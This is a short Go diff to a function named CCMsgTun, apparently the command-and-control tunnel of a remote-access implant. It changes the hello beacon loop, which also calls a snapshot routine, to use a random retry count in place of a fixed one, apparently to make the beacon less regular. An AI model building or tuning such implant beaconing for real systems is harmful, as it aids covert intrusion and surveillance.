@@ -174,8 +174,8 @@ func CCMsgTun(ctx context.Context, cancel context.CancelFunc) (err error) {
 	// send hello every second
 	for ctx.Err() == nil {
 		util.TakeASnap()
-		if !sendHello(10) {
-			log.Print("sendHello failed after 10 tries")
+		if !sendHello(util.RandInt(1, 10)) {
+			log.Print("sendHello failed")
 			break
 		}
 	}
